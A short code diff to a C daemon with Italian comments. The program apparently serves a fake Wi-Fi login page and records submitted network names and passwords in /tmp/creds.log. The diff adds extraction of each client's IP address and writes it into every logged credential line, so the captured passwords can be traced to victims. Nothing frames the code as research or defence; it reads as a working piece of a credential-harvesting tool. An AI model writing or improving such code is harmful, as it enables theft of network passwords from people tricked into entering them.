@@ -159,6 +159,9 @@ char *get_ssid() {
 }
 
 int main() {
+  // Imposta la PATH per trovare gli utility in /usr/bin/additional
+  setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/additional", 1);
+
   // Demone: esegue fork e si stacca dal terminale
   pid_t pid = fork();
   if (pid < 0)
@@ -233,10 +236,18 @@ int main() {
     exit(EXIT_FAILURE);
 
   while (1) {
+    addrlen = sizeof(address);
     client_fd =
         accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen);
     if (client_fd < 0)
       continue;
+
+    // Estrae l'IP del client
+    char client_ip[64] = "unknown";
+    char *ip_str = inet_ntoa(address.sin_addr);
+    if (ip_str) {
+      strncpy(client_ip, ip_str, sizeof(client_ip) - 1);
+    }
 
     memset(req_buf, 0, BUFFER_SIZE);
     int read_bytes = recv(client_fd, req_buf, BUFFER_SIZE - 1, 0);
@@ -285,7 +296,7 @@ int main() {
 
         FILE *log_f = fopen("/tmp/creds.log", "a");
         if (log_f) {
-          fprintf(log_f, "[%s] ip=unknown ssid=%s pass=%s\n", time_str,
+          fprintf(log_f, "[%s] ip=%s ssid=%s pass=%s\n", time_str, client_ip,
                   ssid ? ssid : "WiFi", dec_p);
           fclose(log_f);
         }
